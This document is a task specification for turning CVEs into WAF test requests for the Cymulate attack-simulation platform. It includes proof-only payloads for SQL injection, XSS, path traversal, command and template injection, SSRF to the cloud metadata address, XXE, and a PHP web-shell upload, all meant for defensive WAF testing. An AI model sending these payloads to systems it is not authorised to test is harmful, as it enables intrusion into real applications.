# Task: build CVE-specific WAF test requests (Cymulate webRequest resources)

## 0. Why we do this

Cymulate is a breach and attack simulation (BAS) platform. These requests are
**sent against the customer's WAF** to test it. The expected result is that the
WAF **blocks** them.

- If the WAF blocks the request, the customer is protected against that CVE.
- If the WAF lets it through, Cymulate reports a gap and gives the customer a
  **mitigation rule** that blocks it.

So every request must be:

- **Truly malicious.** It must look like a real attack, so a WAF is expected to
  block it. A harmless or normal-looking request proves nothing: a WAF that lets
  it through is not failing.
- **A faithful simulation of the CVE's exploit.** The same path, parameter and
  attack, so "blocked" really means "protected against this CVE", and the
  mitigation rule we give later targets the real attack.
- **Specific enough to write a blocking rule for** (path + parameter + payload
  pattern). Any WAF rule, nuclei template or signature you find while
  researching is used for that mitigation, so always keep its link.
- **Safe.** It simulates the attack and proves the WAF reaction. It does not
  harm the target (proof-only payloads, section 6.3).

You get `waf_cve_candidates.zip`. It holds one file, `targets.json`, a list of
106,831 CVEs. For each CVE, build **one HTTP request** in Cymulate `webRequest`
format that a WAF should block, and that follows the CVE's real exploit. Write
the results to one JSON file.

## 1. The two conditions (both must pass)

1. **Malicious enough:** a WAF would block it. It carries a real attack
   signature (XSS, SQLi, path traversal, command injection, SSRF, ...).
2. **Tied to the CVE:** same method, path, parameter and attack type as the
   CVE's PoC / advisory / fix / WAF rule. A generic payload sent to a guessed
   path does **not** count.

If you cannot meet both, drop the CVE and record why. Never invent an endpoint
or a parameter.

## 2. Input: `targets.json`

```json
{
  "snapshot_date": "2026-11-01",
  "total": 106831,
  "counts": {"READY": 66723, "NEW_READY": 2301, "RECOVERABLE": 36814, "NEW_RECOVERABLE": 993},
  "order": "READY, NEW_READY, RECOVERABLE, NEW_RECOVERABLE; newest CVE first within each group",
  "targets": [
    {
      "cve_id": "CVE-2026-37337",
      "group": "READY",
      "bug_type": "SQL injection",
      "cwe": ["CWE-89"],
      "product": "SourceCodester / Simple Music Cloud Community System",
      "description": "...",
      "poc_refs": ["https://github.com/..."],
      "other_refs": ["https://vuldb.com/..."],
      "filter_reason": "injection payload with a known entry point",
      "label_confidence": "high",
      "status": "pending"
    }
  ]
}
```

| Group | Meaning |
|---|---|
| `READY` | Injection-type bug and the entry point (path / parameter) is known from the description or a PoC-type link. |
| `NEW_READY` | Same, but the CVE was published after the original web/non-web labelling. Its web label is only a keyword check, so confirm it is really a web request. |
| `RECOVERABLE` | Injection-type bug, but the entry point is **not public**. Becomes buildable only if you find the path and parameter (section 5). |
| `NEW_RECOVERABLE` | Same as RECOVERABLE, for the newer CVEs. |

`poc_refs` holds links likely to have a PoC or write-up (GitHub, gist, WPScan,
Wordfence, GHSA advisories, huntr, VulnCheck, fix commits/PRs). `other_refs`
holds the rest (VulDB, vendor bulletins, Patchstack, NVD, ...).

Work in the file's order. Update each target's `status` to `built` or
`dropped` as you go, so the work can resume.

## 3. Workflow for every CVE

1. **Read** the description and the links. Open `poc_refs` first.
2. **Search the web for WAF rules for this CVE.** This step is required, do not
   skip it (see 3.1). The only exception: the PoC already gives the exact
   request **and** the payload is a standard, obvious signature (for example a
   classic `' UNION SELECT` in a named parameter), so you know with high
   certainty what the request must be. Even then, a quick search is preferred.
3. **Find** the method, path, parameter, where the payload goes (query, form
   body, JSON, header, cookie, multipart file), and whether auth is needed.
4. **Confirm it is a server-side web request.** Drop it if the input is LLM
   output, a library / Python / JS API, a CLI argument, a config file, a
   malicious model or file opened locally, or a DOM XSS payload that stays in
   the browser (`#fragment`).
5. **Build** the request (section 6).
6. **Check** both conditions (section 6.6).
7. **Write** the result (section 8).

### 3.1 How to search for WAF rules

Run several searches per CVE and review the top results:

- `CVE-XXXX-YYYY WAF rule`
- `CVE-XXXX-YYYY ModSecurity` / `CVE-XXXX-YYYY OWASP CRS`
- `CVE-XXXX-YYYY nuclei template` (projectdiscovery/nuclei-templates: these
  hold the **exact HTTP request** and are the best source)
- `CVE-XXXX-YYYY Snort` / `Suricata` / `Emerging Threats` signature
- `CVE-XXXX-YYYY virtual patch` and vendor names: Cloudflare, Imperva, F5,
  Akamai, AWS WAF, Fortinet FortiWeb, Barracuda, Radware, Wordfence firewall,
  Patchstack, Sucuri
- the product name plus the bug type, for example
  `"Simple Music Cloud" view_playlist SQL injection`

What to take from a rule:

- The **path, parameter, method and pattern** it matches. Build the request so
  it would trigger that rule.
- If a rule matches only on the path (a virtual patch for a logic bug), that is
  **not** enough for condition 1. You still need a real attack signature.
- Add every rule link you used to the resource description (section 8).

Most long-tail CVEs have no vendor WAF rule. Nuclei templates, Snort/Suricata
signatures and PoC repos are much more common. If no rule exists, build from
the PoC / advisory / fix and say so in the description.

## 4. READY / NEW_READY

Follow section 3. The entry point is usually in the description (VulDB style:
"file /booking.php ... argument fname") or in a `poc_refs` link. The PoC is the
source of truth when it differs from the CVE text.

## 5. RECOVERABLE / NEW_RECOVERABLE

The bug type is good but the entry point is not public. Try, in this order:

1. **WAF rule search** (section 3.1). Rules and nuclei templates often name
   the path and parameter.
2. **Fix diff.** Compare the last vulnerable and the first fixed version:
   - WordPress plugins: `plugins.trac.wordpress.org/changeset/...`, or the two
     zips from `downloads.wordpress.org/plugin/<slug>.<version>.zip`. Look for
     newly added `sanitize_*`, `esc_*`, `$wpdb->prepare`, `wp_verify_nonce`,
     `current_user_can`. The changed function shows the AJAX action, REST route
     or shortcode, and the parameter.
   - GitHub projects: the fix commit / PR / GHSA in the links.
3. **Third-party write-ups:** blog posts, exploit-db, research sites.

If none gives a concrete path + parameter, drop it as
`DROPPED_NO_ENTRY_POINT`. Do not send a generic payload to a guessed path.

Only read downloaded code. Never run it.

## 6. How the WAF web request must look

### 6.1 Format

The request is raw HTTP text, stored in `value.input`:

```
<METHOD> <path>?<query> HTTP/1.1
Host: {{target_host}}
<other headers>

<body>
```

Rules:

- `Host: {{target_host}}`. Never a real hostname; the platform fills it in.
- LF (`\n`) line endings. One blank line between headers and body. With no
  body, still end with a blank line (`\n\n`).
- Method must be one of GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS, TRACE,
  CONNECT.
- Request line ≤ 8,000 characters.
- If you set `Content-Length`, it must match the body exactly. Simpler: leave
  it out.
- No header name with a trailing space. (HTTP request smuggling, CWE-444,
  cannot be expressed. Drop those.)
- Add `Content-Type` when there is a body (`application/x-www-form-urlencoded`,
  `application/json`, `multipart/form-data; boundary=...`, `text/xml`).
- Keep the path exactly as in the PoC, including the install folder
  (`/wp-admin/admin-ajax.php`, `/music/index.php`, `/prod-api/...`,
  `/hospital/...`).
- Session cookies, CSRF tokens, nonces and bearer tokens may be **dummy
  values** (`dummy`). The WAF checks the request before the app does. Include
  the header or field so the request shape matches the real one.
- URL-encode payloads in the query string and in form bodies where the PoC
  does.

### 6.2 Real prod example (CVE-2020-5192, PHPGurukul HMS SQLi)

```
POST /hospital/hms/doctor/search.php HTTP/1.1
Host: {{target_host}}
Content-Type: application/x-www-form-urlencoded

searchdata='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT(md5(999999999),1),2),NULL--+PqeG&search=
```

### 6.3 Payload per bug type

Use **proof-only** payloads. They must look like an attack to a WAF, but do
nothing harmful: `alert(1)`, `id`, `SLEEP(5)`, reading `/etc/passwd`. Never
delete, write, drop tables, or call out to a real third-party host.

Put the payload **in the exact parameter** the CVE names.

| Bug type | Payload (in the CVE's parameter) | Example |
|---|---|---|
| Reflected XSS | `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`; attribute context: `" onmouseover="alert(1)` | `GET /search.php?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E` |
| Stored XSS | Send the **storing** request (the one that saves the payload), not the page that shows it | `POST /endpoints/payments/rename.php` body `paymentId=1&name=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E` |
| SQL injection | `' OR 1=1-- -`, `UNION SELECT ...`, or time-based `AND SLEEP(5)` | `GET /music/index.php?page=view_playlist&id=-3%20union%20select%201,2,database(),4,5,6--+` |
| Path traversal / LFI | `../../../../etc/passwd`, `/etc/passwd`, `../wp-config.php` | `POST /wp-admin/admin-ajax.php` body `action=tribe_aggregator_create_import&aggregator%5Bcsv%5D%5Bfile%5D=%2Fetc%2Fpasswd&...` |
| OS command injection | `;id`, `|id`, `$(id)`, `` `id` `` | `POST /goform/setX` body `host=127.0.0.1;id` |
| Code / template injection | PHP `<?php system('id'); ?>`, SSTI `{{7*7}}` / `${7*7}`, Python `__import__('os').system('id')`, EL `${T(java.lang.Runtime).getRuntime().exec('id')}` | in the expression / template parameter |
| SSRF | A cloud metadata URL: `http://169.254.169.254/latest/meta-data/`. A plain external URL is often **not** blocked | `GET /cdn-cgi\image/aaaa/http://169.254.169.254/latest/meta-data/` |
| File upload | Multipart file with a server-side script name and content (`shell.php` with `<?php system($_GET['c']); ?>`); for SVG XSS an SVG with `onload` | see 6.4 |
| XXE | `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>` | XML body, `Content-Type: text/xml` |
| Deserialization | The serialized-object marker for the stack: Java `rO0AB...` (base64) / `aced0005` with a known gadget class name; PHP `O:8:"stdClass":...`; .NET `AAEAAAD/////` | in the exact cookie / parameter / body the CVE uses |
| LDAP / XPath / NoSQL | `*)(uid=*))(|(uid=*`, `' or '1'='1`, `{"$ne": null}` | in the named parameter |
| CRLF / header injection | `%0d%0aSet-Cookie:%20x=1` | in the named parameter |

### 6.4 Multipart upload example (CVE-2026-75307, zhitan-ems SVG XSS)

```
POST /prod-api/equipmentFile/upload HTTP/1.1
Host: {{target_host}}
Authorization: Bearer dummy
Content-Type: multipart/form-data; boundary=----cym

------cym
Content-Disposition: form-data; name="file"; filename="xss_test.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>
------cym--
```

ModSecurity / OWASP CRS does not inspect uploaded file contents by default.
Cloud WAFs that scan the body usually do. Mention this in the description.

### 6.5 Good and bad

Good: the exact PoC path + parameter, with a proof-only payload from 6.3.

Bad (do not produce):
- `GET /getpage.lua?pid=1000&ETHCheat=1`. The real exploit for a credential
  leak, but no attack signature, so it fails condition 1.
- `POST /wp-admin/admin-ajax.php` with `action=<guessed>&x=<script>...`. A real
  signature, but the action is a guess, so it fails condition 2.
- `pvid=AAAA...` (1,500 bytes) for a buffer overflow. Only a length rule
  catches it, so it fails condition 1.
- `http://attacker.example` as an SSRF target. Many WAFs let it through; use the
  metadata IP.

### 6.6 The two-condition check (every request)

**Condition 1 (WAF blocks it):** the payload matches a well-known signature
class (OWASP CRS 941 XSS, 942 SQLi, 930 LFI, 932 RCE, 933 PHP, 934 injection/SSRF,
944 Java) or the specific WAF rule you found. Over-long strings,
normal-looking requests and plain external URLs fail.

**Condition 2 (tied to the CVE):** same method + path + parameter as the
PoC / advisory / fix / WAF rule, and same attack class as the CWE and
description. If you had to guess the path or parameter, it fails.

## 7. Pitfalls already seen

- **The web label is noisy.** About 15% of reviewed "web" CVEs were not web:
  MetaGPT `eval()` of LLM output, MetaGPT Python-API path traversal, vLLM
  malicious HuggingFace model, an ipTIME NAS overflow fed from a config file.
- **The CWE can oversell the bug.** OpenCode Studio is CWE-22, but the real
  issue is missing authentication with no `../` payload. Trust the PoC.
- **Patchstack pages have no PoC or parameter.** Use the WAF-rule search and
  the fix diff.
- **VulDB descriptions name the file and argument** ("file /booking.php ...
  argument fname"). Usually enough, and the linked GitHub PoC has the full
  request.
- **PoC links die.** If a PoC repo is 404, look for a mirror, a nuclei template,
  the VulDB submit page or the fix diff. Otherwise drop as `DROPPED_POC_GONE`.
- **The PoC path can differ from the CVE text.** CVE-2026-37337 says
  `/music/view_playlist.php`, but the injectable URL is
  `/music/index.php?page=view_playlist&id=`. Use the PoC.
- **CVSS does not matter** for this task. Do not rank or skip by score.
- **Vendor-only bulletins** (Oracle CPU, PSIRT pages) rarely give a path. Search
  for WAF rules and write-ups; otherwise drop.

## 8. Output

### 8.1 `waf_webrequests.json` (main output)

One unified JSON array of Cymulate `webRequest` resources, one per CVE that
passed **both** conditions. Example of one entry:

```json
[
  {
    "name": "CVE-2026-37337 - SourceCodester Simple Music Cloud Community System SQL Injection",
    "displayName": "CVE-2026-37337 - SourceCodester Simple Music Cloud Community System SQL Injection",
    "description": "SourceCodester Simple Music Cloud Community System 1.0 is vulnerable to SQL injection in the id parameter of the view_playlist page (index.php?page=view_playlist). The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/mt-0505/cve-report/blob/main/sourcecodester/simple-music-cloud-community-system/SQL-2.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2026-37337 (CVE record)",
    "type": "webRequest",
    "value": {
      "input": "GET /music/index.php?page=view_playlist&id=-3%20union%20select%201,2,database(),4,5,6--+ HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
    },
    "cves": ["CVE-2026-37337"],
    "cwes": ["CWE-89"],
    "tags": ["Web Application Firewall", "IOB", "SIEM", "SOAR", "CWE-89", "SQL Injection"],
    "risk": 3,
    "platforms": ["php", "sql"],
    "techniques": ["T1190"],
    "tactics": ["TA0001"],
    "targetedSectors": ["General"],
    "reference": [
      {"title": "poc_github for CVE-2026-37337", "link": "https://github.com/mt-0505/cve-report/blob/main/sourcecodester/simple-music-cloud-community-system/SQL-2.md"}
    ],
    "public": false,
    "visible": true
  }
]
```

Field rules:

| Field | Rule |
|---|---|
| `name` / `displayName` | `CVE-XXXX-YYYY - <Vendor Product> <Bug type>`. Same value in both. |
| `description` | 1–3 sentences: what is vulnerable, which parameter, what the request sends, and whether a WAF rule was found. Then a blank line and **"References used to recreate this request:"** with **every link you actually used** (PoC, advisory, fix commit/diff, WAF rule / nuclei template / signature, CVE record), one per line, each with a short label in brackets. Required on every entry. |
| `type` | Always `webRequest`. |
| `value.input` | The raw HTTP request (section 6.1). |
| `cves` | `["CVE-XXXX-YYYY"]`. |
| `cwes` | CWE IDs, for example `["CWE-89"]`. |
| `tags` | By name: `Web Application Firewall`, `IOB`, `SIEM`, `SOAR`, `CWE-<n>` (same as `cwes`), plus one attack-type tag: `SQL Injection`, `Cross-Site Scripting`, `Path Traversal`, `Command Injection`, `Code Injection`, `SSRF`, `File Upload`, `XXE`, `Deserialization`, `LDAP Injection`, `XPath Injection`, `NoSQL Injection`, `CRLF Injection`. |
| `risk` | low=1, medium=2, high=3, critical=4, from the CVE severity; 2 if none. |
| `platforms` | Old platform list only: `php`, `sql`, `java`, `windows`, `linux`, and similar. Do not use `dotnet`, `nodejs`, `python`, `ruby`, `perl`, `ai_ml` (the parser drops them). |
| `techniques` / `tactics` | `["T1190"]` / `["TA0001"]`. |
| `targetedSectors` | `["General"]`. |
| `reference` | The main source as `{"title": "poc_<source> for CVE-...", "link": "..."}` (for example `poc_github`, `poc_nuclei`, `waf_rule_cloudflare`). Add entries for other key sources. |
| `public` / `visible` | `false` / `true`. |

Do not add `_id`, `clientID`, `createdBy`, dates or `basTags` IDs. The platform
fills those in.

### 8.2 `dropped.json` (side output)

Every CVE you checked but did not build, so nobody repeats the work:

```json
[
  {
    "cve_id": "CVE-2026-41523",
    "group": "READY",
    "result": "DROPPED_NOT_WEB",
    "notes": "Exploited by publishing a malicious HuggingFace model; no HTTP request.",
    "waf_rules_found": [],
    "links_checked": ["https://github.com/vllm-project/vllm/security/advisories/GHSA-q8gq-377p-jq3r"]
  }
]
```

`result` is one of `DROPPED_NOT_WEB`, `DROPPED_NO_ENTRY_POINT`,
`DROPPED_NO_SIGNATURE`, `DROPPED_POC_GONE`, `DROPPED_OTHER`.

## 9. New CVEs

`targets.json` reflects CVEs published up to 2026-11-01. At the start of each
work session, also check for CVEs published after that date (official
cvelistV5 repo, `https://github.com/CVEProject/cvelistV5`, folder
`cves/<year>/`, field `cveMetadata.datePublished`; or the NVD API
`https://services.nvd.nist.gov/rest/json/cves/2.0?pubStartDate=...&pubEndDate=...`).
Keep only ones that are:

- an injection-type bug (XSS, SQLi, path traversal / LFI, command or code
  injection, SSRF, file upload, XXE, deserialization, template / EL injection,
  LDAP / XPath / NoSQL, CRLF), **and**
- reachable by an inbound HTTP request.

Not: missing auth, IDOR, info leak, CSRF, race, DoS, crypto, memory corruption.
Add the kept ones to the end of the work queue and process them the same way.

## 10. Safety

- Only **build** the request text. Do not send it to any host you do not own.
- Test only against your own lab or an authorised target.
- Proof-only payloads (section 6.3). Nothing destructive.

## 11. Suggested order

1. READY, newest first; within that, SQLi, path traversal, command injection
   and SSRF before XSS (stronger WAF signatures).
2. NEW_READY.
3. RECOVERABLE / NEW_RECOVERABLE, starting with WordPress plugins (fix diffs are
   easy to get).
4. New CVEs from section 9.

Write `waf_webrequests.json` and `dropped.json` often (for example every 25
CVEs) so no work is lost.
